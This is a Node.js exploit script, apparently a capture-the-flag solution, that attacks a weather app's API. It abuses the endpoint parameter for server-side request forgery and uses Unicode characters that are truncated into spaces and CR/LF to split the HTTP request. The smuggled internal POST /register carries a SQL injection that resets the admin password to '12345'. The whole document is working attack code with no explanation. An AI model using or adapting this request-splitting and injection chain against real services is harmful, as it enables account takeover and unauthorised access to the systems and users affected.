const axios = require('axios');

async function request() {
    const space = "\u{0120}";
    const r = "\u{010D}";
    const n = "\u{010A}";

    let username = 'admin';
    let password = "')" + space + "ON" + space + "CONFLICT" + space + "(username)" + space + "DO" + space + "UPDATE" + space + "SET" + space + "password" + space + "=" + "%2712345%27;"
    username = username.replace(" ", space).replace("'", "%27").replace('"', "%22");
    password = password.replace(" ", space).replace("'", "%27").replace('"', "%22");
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);
    
    const contentLength = username.length + password.length + 19;
    const rn = r + n;
    const httpTag = "HTTP/1.1";
    const hostHeader = "Host:" + space + "127.0.0.1:88";
    const postReqTag = "POST" + space + "/register";
    const contentTypeHeader = "Content-Type:" + space + "application/x-www-form-urlencoded"
    const contentLengthHeader = "Content-Length:" + space + contentLength.toString();
    const payloadUrl = "127.0.0.1:88/" + space + httpTag + rn + hostHeader + rn + rn + postReqTag + space + httpTag + rn + hostHeader + rn + contentTypeHeader + rn + contentLengthHeader + rn + rn + "username=" + username + "&password=" + password + rn + rn + "GET" + space;

    axios.post('http://127.0.0.1:1338/api/weather', {
        endpoint: payloadUrl,
        city: "Toronto",
        country: "CA"
    }, {
        Referer: '127.0.0.1:1338',
        'Content-Type': 'application/json',
        Origin: '139.59.167.73:30799',
    });
}

request();
